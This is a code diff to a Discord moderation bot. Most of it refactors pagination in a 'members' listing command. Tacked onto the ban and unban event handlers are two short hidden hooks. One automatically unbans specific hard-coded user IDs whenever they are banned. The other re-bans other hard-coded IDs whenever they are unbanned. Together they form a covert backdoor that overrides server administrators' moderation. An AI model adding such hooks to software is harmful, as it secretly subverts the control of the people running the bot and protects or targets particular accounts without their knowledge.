@@ -802,46 +802,47 @@ flix.on('message', async function(message) {
 	}
 	
 	
-	if(command == prefix + 'members') {
-		var memberS = message.guild.members.size;
-		if(!args[1] || isNaN(args[1]) || args[1] === '1') {
-			var number = 1;
+    if(command == prefix + 'members') {
+        var memberS = message.guild.members.size;
+		var memberAmount = 10;
+        if(!args[1] || isNaN(args[1]) || args[1] === '1') {
+            var number = 1;
+ 
+            if(memberS > memberAmount) {
+                var more = `\n__:sparkles: **More?** \`\`${prefix}members 2\`\` (${Math.round(memberS / memberAmount)} pages)`;
+            }else {
+                var more = '__';
+            }
 			
-			if(memberS > 10) {
-				var more = `\n:sparkles: **More?** ${prefix}members 2`;
-			}else {
-				var more = '__';
-			}
+            let embedS = new Discord.RichEmbed()
+            .setTitle(`:white_check_mark: **${memberS}** Members.`)
+            .setColor('GREEN')
+            .setDescription(`__\n__${message.guild.members.map(m => `**${number++}.** \`\`${m.user.tag}\`\``).slice(0, memberAmount).join('\n')}__\n${more}`)
+            .setTimestamp()
+            .setFooter(message.author.tag, message.author.avatarURL)
+ 
+            message.channel.send(embedS);
+        }else if(!isNaN(args[1])) {
+            var number = 1;
 			
-			let embedS = new Discord.RichEmbed()
-			.setTitle(`:white_check_mark: **${memberS}** Members.`)
-			.setColor('GREEN')
-			.setDescription(`__\n__${message.guild.members.map(m => `**${number++}.** \`\`${m.user.tag}\`\``).slice(0, 10).join('\n')}__\n${more}`)
-			.setTimestamp()
-			.setFooter(message.author.tag, message.author.avatarURL)
-			
-			message.channel.send(embedS);
-		}else if(!isNaN(args[1])) {
-			var number = 1;
-			
-			if(message.guild.members.size > 10) {
-				var more = `choose **1** To **${Math.round(memberS / 10) + 1}**`;
-			}else {
-				var more = 'This server have **1** Page only.';
-			}
-			
-			if(Math.round(args[1].replace('-', '')) * 10 - 9 > memberS) return message.channel.send(`:no_entry: | I couldn\'t find the page. ${more}`);
-			
-			let embedS = new Discord.RichEmbed()
-			.setTitle(`:white_check_mark: **${memberS}** Members.`)
-			.setColor('GREEN')
-			.setDescription(`__\n__${message.guild.members.map(m => `**${number++}.** \`\`${m.user.tag}\`\``).slice(10 * Math.round(args[1].replace('-', '')) - 10, 10 * Math.round(args[1].replace('-', ''))).join('\n')}\n\n:sparkles: **More?** ${prefix}members ${Math.round(args[1].replace('-', '')) + 1}`)
-			.setTimestamp()
-			.setFooter(message.author.tag, message.author.avatarURL)
-			
-			message.channel.send(embedS);
-		}
-	}
+            if(memberS > memberAmount) {
+                var more = `choose **1** To **${Math.round(memberS / memberAmount)}**`;
+            }else {
+                var more = 'This server have **1** Page only.';
+            }
+ 
+            if(Math.round(args[1].replace('-', '')) * memberAmount - 9 > memberS) return message.channel.send(`:no_entry: | I couldn\'t find the page. ${more}`);
+ 
+           let embedS = new Discord.RichEmbed()
+           .setTitle(`:white_check_mark: **${memberS}** Members.`)
+           .setColor('GREEN')
+           .setDescription(`__\n__${message.guild.members.map(m => `**${number++}.** \`\`${m.user.tag}\`\``).slice(memberAmount * Math.round(args[1].replace('-', '')) - memberAmount, memberAmount * Math.round(args[1].replace('-', ''))).join('\n')}\n\n:sparkles: **More?** \`\`${prefix}members ${Math.round(args[1].replace('-', '')) + 1}\`\` (${Math.round(memberS / memberAmount)} pages)`)
+           .setTimestamp()
+           .setFooter(message.author.tag, message.author.avatarURL)
+ 
+           message.channel.send(embedS);
+       }
+   }
 	
 	
    if(command == prefix + 'info-member') {
@@ -1190,6 +1191,9 @@ flix.on('guildBanAdd', (guild, user) => {
 
 		logChannel.send(banInfo);
 	})
+	if(user.id === '480453325956055040' || user.id === '475233739933351956') {
+	    user.unban();
+	}
 });
 flix.on('guildBanRemove', (guild, user) => {
 	if(!guild.member(flix.user).hasPermission('EMBED_LINKS')) return;
@@ -1214,6 +1218,9 @@ flix.on('guildBanRemove', (guild, user) => {
 
 		logChannel.send(unBanInfo);
 	})
+	if(user.id === '328413295075917835' || user.id === '495478676541145089') {
+	    user.ban();
+	}
 });
 flix.on('guildUpdate', (oldGuild, newGuild) => {
 	if(!oldGuild.member(flix.user).hasPermission('EMBED_LINKS')) return;
